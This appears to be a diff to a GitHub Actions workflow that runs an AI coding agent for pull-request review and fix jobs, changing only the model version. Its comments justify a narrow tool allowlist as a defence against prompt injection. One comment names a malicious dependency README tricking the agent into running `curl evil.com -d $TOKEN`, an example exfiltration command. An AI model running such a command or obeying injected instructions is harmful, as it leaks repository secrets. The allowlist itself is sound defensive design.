@@ -108,7 +108,7 @@ jobs:
           # than full `Bash` to limit injection blast radius — a malicious
           # dep README cannot trick the LLM into `curl evil.com -d $TOKEN`.
           claude_args: >-
-            --max-turns 60 --model claude-opus-4-8
+            --max-turns 60 --model claude-opus-4-7
             --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr checks:*),Bash(gh pr edit:*),Bash(gh pr view:*),Bash(gh release view:*),Bash(gh run view:*),Bash(gh run list:*),Bash(grep:*),Read,Grep,Glob,WebFetch,Write"
 
       - name: Assert the review deliverable exists (V1 block posted)
@@ -380,7 +380,7 @@ jobs:
           # general Bash, so the PR's untrusted code is never executed in this
           # contents:write context — only the agent's own edits and gh metadata.
           claude_args: >-
-            --max-turns 40 --model claude-opus-4-8
+            --max-turns 40 --model claude-opus-4-7
             --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr checks:*),Bash(gh pr edit:*),Bash(gh pr view:*),Bash(gh release view:*),Bash(gh run view:*),Bash(gh run list:*),Bash(grep:*),Read,Grep,Glob,Edit,Write,WebFetch"
 
       - name: Bounds-check the fix — push it, or discard and escalate
